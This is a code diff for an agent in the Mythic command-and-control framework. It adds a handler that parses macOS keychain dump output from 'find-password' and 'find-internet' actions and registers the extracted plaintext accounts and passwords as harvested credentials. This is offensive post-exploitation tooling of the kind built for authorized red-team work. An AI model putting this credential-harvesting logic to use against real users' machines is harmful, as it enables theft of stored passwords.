@@ -2,8 +2,10 @@ package agentfunctions
 
 import (
 	"fmt"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -114,6 +116,62 @@ func init() {
 		},
 		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
 			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			action, _ := processResponse.TaskData.Args.GetStringArg("action")
+			if action != "find-password" && action != "find-internet" {
+				return response
+			}
+			// Parse macOS security command output for password entries
+			// Format: "password: \"value\"" or "password: 0x..." lines
+			hostname := processResponse.TaskData.Callback.Host
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+			var account, service string
+			for _, line := range strings.Split(responseText, "\n") {
+				line = strings.TrimSpace(line)
+				if strings.Contains(line, `"acct"`) && strings.Contains(line, "=") {
+					parts := strings.SplitN(line, "=", 2)
+					if len(parts) == 2 {
+						account = strings.Trim(strings.TrimSpace(parts[1]), `"`)
+					}
+				} else if strings.Contains(line, `"svce"`) && strings.Contains(line, "=") {
+					parts := strings.SplitN(line, "=", 2)
+					if len(parts) == 2 {
+						service = strings.Trim(strings.TrimSpace(parts[1]), `"`)
+					}
+				} else if strings.Contains(line, `"srvr"`) && strings.Contains(line, "=") {
+					parts := strings.SplitN(line, "=", 2)
+					if len(parts) == 2 {
+						service = strings.Trim(strings.TrimSpace(parts[1]), `"`)
+					}
+				} else if strings.HasPrefix(line, "password:") {
+					pass := strings.TrimSpace(strings.TrimPrefix(line, "password:"))
+					pass = strings.Trim(pass, `"`)
+					if pass != "" && !strings.HasPrefix(pass, "0x") && account != "" {
+						realm := hostname
+						if service != "" {
+							realm = service
+						}
+						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+							CredentialType: "plaintext",
+							Realm:          realm,
+							Account:        account,
+							Credential:     pass,
+							Comment:        fmt.Sprintf("keychain (%s)", action),
+						})
+					}
+				}
+			}
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			return response
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
